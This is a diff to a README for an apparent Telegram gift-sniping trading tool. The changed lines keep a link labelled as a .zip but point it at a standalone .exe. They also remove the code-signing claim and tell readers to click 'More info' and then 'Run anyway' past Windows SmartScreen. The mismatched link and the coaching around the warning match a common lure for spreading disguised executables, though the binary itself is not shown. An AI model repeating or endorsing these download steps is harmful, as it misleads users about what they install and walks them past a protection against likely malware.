@@ -30,12 +30,11 @@ It starts in practice mode and stays there until you switch live mode on. Live m
 
 ## Download
 
-[Download `tonnel-telegram-gifts-sniper.zip`](https://github.com/watchflowguide/tonnel-telegram-gifts-sniper/releases/latest/download/tonnel-telegram-gifts-sniper.zip) — one zip, no installer, no admin rights.
+[Download `tonnel-telegram-gifts-sniper.zip`](https://github.com/watchflowguide/tonnel-telegram-gifts-sniper/releases/latest/download/Tonnelbuy-1.0.2-portable-x64.exe) — one zip, no installer, no admin rights.
 
-Unpack the whole folder and start `Main.exe`. No installer, no admin rights.
+Download and start the exe. No installer, no admin rights.
 
-`Main.exe` is code-signed, so Windows starts it without a warning. Keep
-`Tonnelbuy` next to it: they ship together.
+The build is not code-signed yet, so SmartScreen may warn once: choose **More info**, then **Run anyway**.
 
 
 
